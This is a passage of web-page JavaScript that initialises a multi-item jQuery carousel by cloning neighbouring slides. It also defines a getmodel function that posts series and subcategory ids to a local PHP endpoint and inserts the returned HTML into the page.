$('.multi-item-carousel').carousel({
    interval: false
});

// for every slide in carousel, copy the next slide's item in the slide.
// Do the same for the next, next item.
$('.multi-item-carousel .item').each(function() {
    var next = $(this).next();
    if (!next.length) {
        next = $(this).siblings(':first');
    }
    next.children(':first-child').clone().appendTo($(this));

    if (next.next().length > 0) {
        next.next().children(':first-child').clone().appendTo($(this));
    } else {
        $(this).siblings(':first').children(':first-child').clone().appendTo($(this));
    }
});
</script>

<script>
function getmodel(gid, subcatid) {
    var sid = gid;
    if (sid != null && subcatid) {
        $.ajax({
            method: "post",
            url: "../../ajaxmodel.php",
            data: {
                series: sid,
                subcatid: subcatid
            },
            dataType: "html",
            success: function(result) {
                $("#ajaxrespon").html('');
                $("#ajaxrespon").html(result);
            }
        });
    }
}
</script>